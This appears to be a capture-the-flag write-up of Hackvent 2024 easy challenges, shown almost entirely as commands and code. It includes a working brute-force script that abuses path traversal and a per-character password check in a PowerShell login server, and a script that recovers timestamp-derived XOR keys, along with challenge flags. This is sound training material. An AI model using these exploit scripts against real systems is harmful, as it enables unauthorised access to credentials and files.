# Hackvent 2024 – Easy

> 原文: https://www.ctfiot.com/218690.html
> ID: 218690


```
oxdf@hacky$ gifsicle --change-color 234 "#000000" --change-color 235 "#ffffff" 04ab832f-50dd-4dea-a834-e0a34fa625b5.gif > 04ab832f-50dd-4dea-a834-e0a34fa625b5-mod.gif
```



```
oxdf@hacky$ unzip help.zip 
Archive: help.zip
 inflating: example1.png 
 inflating: example2.png 
 inflating: example3.png 
 inflating: example4.png 
 inflating: example5.png 
 inflating: example6.png 
 inflating: example7.png 
 inflating: example8.png 
 inflating: example9.png 
oxdf@hacky$ ls
example1.png example2.png example3.png example4.png example5.png example6.png example7.png example8.png example9.png help.zip
```



```
oxdf@hacky$ file *.png
example1.png: PNG image data, 162 x 200, 1-bit grayscale, non-interlaced
example2.png: PNG image data, 162 x 100, 1-bit grayscale, non-interlaced
example3.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
example4.png: PNG image data, 198 x 163, 1-bit grayscale, non-interlaced
example5.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
example6.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
example7.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
example8.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
example9.png: PNG image data, 162 x 191, 1-bit grayscale, non-interlaced
```



```
import sys

def calculate_check_digit(ean8):
 odd_sum = sum(int(ean8[i]) * 3 for i in range(0, 7, 2)) # Odd positions
 even_sum = sum(int(ean8[i]) for i in range(1, 6, 2)) # Even positions

 total_sum = odd_sum + even_sum
 check_digit = (10 - (total_sum % 10)) % 10
 return check_digit

def find_missing_digit(ean8):
 missing_index = ean8.index('?')

 for digit in range(10):
 ean_candidate = ean8[:missing_index] + str(digit) + ean8[missing_index + 1:]
 if calculate_check_digit(ean_candidate) == int(ean_candidate[-1]):
 return digit

 raise ValueError("No valid digit found for the EAN-8 code.")

def main():
 if len(sys.argv) != 2:
 print("Usage: python script.py <EAN-8 code>")
 sys.exit(1)

 ean8_code = sys.argv[1]

 if len(ean8_code) != 8 or ean8_code.count('?') != 1:
 print("Invalid EAN-8 code. It must have exactly 8 characters and one '?' for the missing digit.")
 sys.exit(1)

 try:
 missing_digit = find_missing_digit(ean8_code)
 print(f"The missing digit is: {missing_digit}")
 except ValueError as e:
 print(e)
 sys.exit(1)

if __name__ == "__main__":
 main()
```



```
oxdf@hacky$ python checksum.py ?3371333
The missing digit is: 1
```



```
oxdf@hacky$ python
Python 3.12.3 (main, Nov 6 2024, 18:32:19) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x40 + 12)
'L'
>>> chr(0x40 + 5)
'E'
>>> chr(0x40 + 20)
'T'
>>> chr(0x40 + 9)
'I'
>>> chr(0x40 + 20)
'T'
>>> chr(0x40 + 19)
'S'
>>> chr(0x40 + 14)
'N'
>>> chr(0x40 + 15)
'O'
>>> chr(0x40 + 23)
'W'
```



```
oxdf@hacky$ unzip -l SuperStar.zip 
Archive: SuperStar.zip
 Length Date Time Name
--------- ---------- ----- ----
 580 2024-12-02 20:36 admin.ps1
 940 2024-12-02 20:34 authenticate.ps1
 173 2024-11-10 21:33 Dockerfile
 220 2024-11-10 21:26 helpers.ps1
 0 2024-11-10 21:26 passwords/
 4 2024-11-10 21:26 passwords/user.txt
 36 2024-11-10 21:26 passwords/admin.txt
 47 2024-11-10 21:27 secret.txt
 1198 2024-12-02 20:34 server.ps1
 500 2024-11-10 21:26 style.css
 0 2024-12-02 19:59 templates/
 454 2024-11-10 21:26 templates/user.html
 529 2024-12-02 19:59 templates/index.html
--------- -------
 4681 13 files
```



```
FROM fxinnovation/powershell
WORKDIR /data
COPY . .

USER root
RUN ["/bin/sh", "-c", "echo 'HV24{f4k3_fl4g}' > flag.txt"]

USER powershell
ENTRYPOINT ["pwsh", "server.ps1"]
```



```
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:8080/")
$listener.Start()
Write-Output "Server started on http://*:8080/"

while ($true) {
 $context = $listener.GetContext()
 $request = $context.Request
 $response = $context.Response

 if ($request.Url.AbsolutePath -ceq "/") {
 # Serve login page
 $htmlContent = Get-Content -Raw -Path "./templates/index.html"
 . ./helpers.ps1 $response $htmlContent "text/html"
 }
 elseif ($request.Url.AbsolutePath -ceq "/style.css") {
 # Serve cool css
 $htmlContent = Get-Content -Raw -Path "./style.css"
 . ./helpers.ps1 $response $htmlContent "text/css"
 }
 elseif ($request.Url.AbsolutePath -ceq "/login") {
 # Authentication
 . ./authenticate.ps1 $request $response
 }
 elseif ($request.Url.AbsolutePath -ceq "/admin") {
 # Admin dashboard
 . ./admin.ps1 $request $response
 }
 elseif ($request.Url.AbsolutePath -ceq "/dashboard") {
 # User dashboard
 $htmlContent = Get-Content -Raw -Path "./templates/user.html"
 . ./helpers.ps1 $response $htmlContent "text/html"
 }
 $response.Close()
}
```



```
param($request, $response)

$username = $request.QueryString["username"]
$password = $request.QueryString["password"]

if (Test-Path "passwords/$username.txt") {
 $storedPassword = Get-Content -Raw -Path "passwords/$username.txt"
 $isAuthenticated = $true

 for ($i = 0; $i -lt $password.Length; $i++) {
 if ($password[$i] -cne $storedPassword[$i]) {
 $isAuthenticated = $false
 Start-Sleep -Milliseconds 500 # brute-force prevention
 break
 }
 }

 if ($isAuthenticated) {
 if ($username -ceq "admin") {
 $response.Redirect("/admin?username=$username&password=$password")
 } else {
 $response.Redirect("/dashboard?username=$username&password=$password")
 }
 } else {
 . ./helpers.ps1 $response "<h1>Invalid password :c</h1>" "text/html"
 }
} else {
 . ./helpers.ps1 $response "<h1>User not found :c</h1>" "text/html"
}
```



```
param($request, $response)

$adminPass = Get-Content -Path "passwords/admin.txt"

if ($request.QueryString["username"] -cne "admin") {
 $response.StatusCode = 403
 . ./helpers.ps1 $response "Santa, go away!" "text/html"
 return
}
if ($request.QueryString["password"] -cne $adminPass) {
 $response.StatusCode = 403
 . ./helpers.ps1 $response "Nope :3" "text/html"
 return
}

$file = Get-Content -Path "secret.txt"
$template = "<h1>Hello, Devil</h1><hr><br>Here is your secret intel on Santa: <br><pre>$file</pre>"
. ./helpers.ps1 $response $template "text/html"
```



```
$isAuthenticated = $true

	for ($i = 0; $i -lt $password.Length; $i++) {
 if ($password[$i] -cne $storedPassword[$i]) {
 $isAuthenticated = $false
 Start-Sleep -Milliseconds 500 # brute-force prevention
 break
 }
 }
```



```
$storedPassword = Get-Content -Raw -Path "passwords/$username.txt"
```



```
$storedPassword = Get-Content -Raw -Path "passwords/$username.txt"
 $isAuthenticated = $true

 for ($i = 0; $i -lt $password.Length; $i++) {
 if ($password[$i] -cne $storedPassword[$i]) {
 $isAuthenticated = $false
 Start-Sleep -Milliseconds 500 # brute-force prevention
 break
 }
 }
 
 if ($isAuthenticated) {
 if ($username -ceq "admin") {
 $response.Redirect("/admin?username=$username&password=$password")
 } else {
 $response.Redirect("/dashboard?username=$username&password=$password")
 }
 } else {
 . ./helpers.ps1 $response "<h1>Invalid password :c</h1>" "text/html"
 }
} else {
 . ./helpers.ps1 $response "<h1>User not found :c</h1>" "text/html"
```



```
import requests
import sys
from string import printable
from urllib.parse import quote_plus

base_url = sys.argv[1].rstrip('/')
filename = sys.argv[2]
password = ''
done = False

while not done:
 for c in printable[:-6]:
 next_pass = password + c
 resp = requests.get(f"{base_url}/login?username={filename}&password={quote_plus(next_pass)}", allow_redirects=False)
 print(f'\r{next_pass}', end='')
 if resp.status_code == 302:
 password += c
 break
 else:
 print(f'\r{password} ')
 done = True
```



```
oxdf@hacky$ python brute.py https://1d30cfb7-92e7-41c5-a111-0afaed7a542d.i.vuln.land/ ../secret
Santa secretly likes pineapp^
...[snip]...
oxdf@hacky$ python brute.py https://1d30cfb7-92e7-41c5-a111-0afaed7a542d.i.vuln.land/ admin
Meow:3
```



```
oxdf@hacky$ python brute.py http://77.90.2.227:8888/ ../flag
HV24{dQw4w9WgXcQ}
```



```
oxdf@hacky$ echo "NzM3ZmUwY2Q2MzA3YTY2MGM4Y2U2YTg1ZDdjYjZkYTdmM2E3ZjE0NA==" | base64 -d
737fe0cd6307a660c8ce6a85d7cb6da7f3a7f144
```



```
oxdf@hacky$ echo "RQAQEg==" | base64 -d | xxd
00000000: 4500 1012 E...
```



```
document.addEventListener('DOMContentLoaded', function() {
	var outputfield = document.getElementById('secret-output');

	var id = window.location.pathname.split('/')[1];
	var key = window.location.hash.substring(1);

	if (!id || !key) {
 outputfield.innerText = 'Invalid link';
 return;
	}

	fetch('/api/fetch/' + id, {
 method: 'GET',
	}).then(function(response) {
 if (response.ok) {
 response.json().then(function(data) {
 var decrypted = decrypt(data.value, key);
 outputfield.innerText = decrypted;
 });
 } else {
 outputfield.innerText = 'An error occurred';
 }
	});
});
```



```
function generateKey() {
 const timestamp = Math.floor(Date.now() / 1000);
 const shaObj = new jsSHA("SHA-1", "TEXT", {
 encoding: "UTF8"
 });
 shaObj.update(timestamp.toString());
 const hash = shaObj.getHash("HEX");
 return hash;
}
```



```
function encrypt(text) {
 const key = generateKey();
 let encrypted = '';
 for (let i = 0; i < text.length; i++) {
 encrypted += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
 }
 return [btoa(encrypted), btoa(key)];
}
```



```
function decrypt(encrypted, key) {
 encrypted = atob(encrypted);
 key = atob(key);
 let decrypted = '';
 for (let i = 0; i < encrypted.length; i++) {
 decrypted += String.fromCharCode(encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length));
 }
 return decrypted;
}
```



```
import requests
import sys
import time
import hashlib
from base64 import b64decode
from itertools import cycle

for i in range(1, 135):
 print(f"\r{i}", end="", flush=True)
 resp = requests.get(f"https://{sys.argv[1]}/api/fetch/{i}")
 if "value" in resp.json():
 break

ct = b64decode(resp.json()["value"])
#ct = b64decode("fW9UAR0QBQ9dFlxaVUBvRABeUT5dEjpYAB9J")
now = int(time.time())
i = 0
while True:
 print(f"\r{i}", end="", flush=True)
 ts = now - i
 key = hashlib.sha1(f"{ts}".encode()).hexdigest().encode()
 flag = ''.join([chr(c ^ k) for c, k in zip(ct, cycle(key))])
 if flag.startswith("HV24"):
 break
 i += 1
 if i > 1000000:
 break

print(f"\r{flag}")
```



```
oxdf@hacky$ python solve.py 4538be27-cc01-41fd-ba36-436b1c29fd04.i.vuln.land
HV24{s0metim3s_t1me_is_k3y}
```



```
https://github.com/santawoods/christmas-secret-feature
```



```
oxdf@hacky$ git clone https://github.com/santawoods/christmas-secret-feature
Cloning into 'christmas-secret-feature'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 3 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (3/3), done.
oxdf@hacky$ cd christmas-secret-feature/
oxdf@hacky$ ls
hello.txt
oxdf@hacky$ cat hello.txt 
Hello everybody
oxdf@hacky$ git status 
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean
```



```
oxdf@hacky$ git log --oneline --all
5c1dff6 (HEAD -> main, origin/main, origin/HEAD) Initial Commit
```



```
oxdf@hacky$ git fetch origin refs/notes/*:refs/notes/*
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
Unpacking objects: 100% (5/5), 469 bytes | 93.00 KiB/s, done.
From https://github.com/santawoods/christmas-secret-feature
 * [new ref] refs/notes/commits -> refs/notes/commits
```



```
oxdf@hacky$ git log --oneline --all
9a2ab37 Notes removed by 'git notes remove'
06af9d2 Notes added by 'git notes add'
5c1dff6 (HEAD -> main, origin/main, origin/HEAD) Initial Commit
```



```
oxdf@hacky$ git show 06af9d2
commit 06af9d20cc50d124bd35cf322180d380325a8030
Author: Santa <santa@christmas.town>
Date: Sat Nov 16 20:07:41 2024 +0100

 Notes added by 'git notes add'

diff --git a/5c1dff6bd6b05a44e41d786a99fa1f95219e2d62 b/5c1dff6bd6b05a44e41d786a99fa1f95219e2d62
new file mode 100644
index 0000000..3617dbd
--- /dev/null
+++ b/5c1dff6bd6b05a44e41d786a99fa1f95219e2d62
@@ -0,0 +1 @@
+SGVyZSBpcyB0aGUgZmxhZzogSFYyNHtzM2NyM3RfbjB0M19mbDRnX2Z1bn0=
```



```
oxdf@hacky$ echo "SGVyZSBpcyB0aGUgZmxhZzogSFYyNHtzM2NyM3RfbjB0M19mbDRnX2Z1bn0=" | base64 -d
Here is the flag: HV24{s3cr3t_n0t3_fl4g_fun}
```
